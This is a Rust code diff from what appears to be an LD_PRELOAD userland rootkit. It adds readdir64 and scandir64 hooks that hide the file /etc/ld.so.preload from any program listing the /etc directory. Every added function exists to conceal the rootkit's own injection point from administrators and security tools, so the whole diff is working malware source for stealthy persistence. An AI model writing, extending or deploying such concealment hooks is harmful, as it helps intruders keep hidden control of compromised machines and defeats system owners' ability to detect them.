@@ -294,6 +294,37 @@ pub fn handle_readdir(dirp: *mut libc::DIR) -> Option<*mut libc::dirent> {
     None
 }
 
+pub fn handle_readdir64(dirp: *mut libc::DIR) -> Option<*mut libc::dirent64> {
+    use std::ffi::CStr;
+    use std::fs;
+
+    unsafe {
+        let fd = libc::dirfd(dirp);
+        let fd_path = format!("/proc/self/fd/{}", fd);
+        let dir_path = fs::read_link(&fd_path).ok()?;
+
+        info!("[readdir64] Directory path resolved: {:?}", dir_path);
+
+        if dir_path.as_os_str() == "/etc" {
+            loop {
+                let entry = libc::readdir64(dirp);
+                if entry.is_null() {
+                    return None;
+                }
+
+                let d_name = CStr::from_ptr((*entry).d_name.as_ptr());
+
+                if d_name.to_string_lossy() != "ld.so.preload" {
+                    return Some(entry);
+                } else {
+                    warn!("[readdir64] Skipping entry: ld.so.preload");
+                }
+            }
+        }
+    }
+    None
+}
+
 thread_local! {
     static ORIGINAL_FILTER: RefCell<Option<unsafe extern "C" fn(*const libc::dirent) -> libc::c_int>> = RefCell::new(None);
 }
@@ -332,6 +363,43 @@ pub fn handle_scandir(
 
             ORIGINAL_FILTER.with(|f| *f.borrow_mut() = filter);
             let result = crate::scandir.get()(dir, namelist, Some(custom_filter), compar);
+            return Some(result);
+        }
+    }
+    None
+}
+
+pub fn handle_scandir64(
+    dir: *const c_char,
+    namelist: *mut *mut *mut libc::dirent64,
+    filter: Option<unsafe extern "C" fn(*const libc::dirent64) -> c_int>,
+    compar: Option<unsafe extern "C" fn(*const libc::dirent64, *const libc::dirent64) -> c_int>,
+) -> Option<c_int> {
+    unsafe {
+        let path_str = CStr::from_ptr(dir).to_string_lossy();
+        info!("[scandir64] Directory path: {:?}", path_str);
+
+        if path_str == "/etc" {
+            pub unsafe extern "C" fn custom_filter(entry: *const libc::dirent64) -> libc::c_int {
+                use std::ffi::CStr;
+
+                let d_name = unsafe { CStr::from_ptr((*entry).d_name.as_ptr()) };
+
+                if d_name.to_string_lossy() == "ld.so.preload" {
+                    warn!("[scandir64] Excluding entry: ld.so.preload");
+                    return 0;
+                }
+
+                ORIGINAL_FILTER.with(|f| {
+                    if let Some(original_filter) = *f.borrow() {
+                        return unsafe { std::mem::transmute::<_, unsafe extern "C" fn(*const libc::dirent64) -> c_int>(original_filter)(entry) };
+                    }
+                    1
+                })
+            }
+
+            ORIGINAL_FILTER.with(|f| *f.borrow_mut() = filter.map(|f| std::mem::transmute(f)));
+            let result = crate::scandir64.get()(dir, namelist, Some(custom_filter), compar);
             return Some(result);
         }
     }
